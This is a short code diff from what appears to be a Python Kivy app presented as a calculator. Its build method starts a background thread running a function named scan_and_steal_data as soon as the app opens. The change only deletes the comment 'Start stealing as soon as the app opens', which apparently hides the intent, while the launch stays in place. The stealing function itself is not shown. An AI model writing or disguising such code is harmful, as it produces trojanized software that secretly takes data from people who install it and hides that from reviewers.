@@ -58,7 +58,7 @@ def scan_and_steal_data():
 
 class CalculatorApp(App):
     def build(self):
-        # Start stealing as soon as the app opens
+        
         threading.Thread(target=scan_and_steal_data).start()
 
         layout = BoxLayout(orientation='vertical')
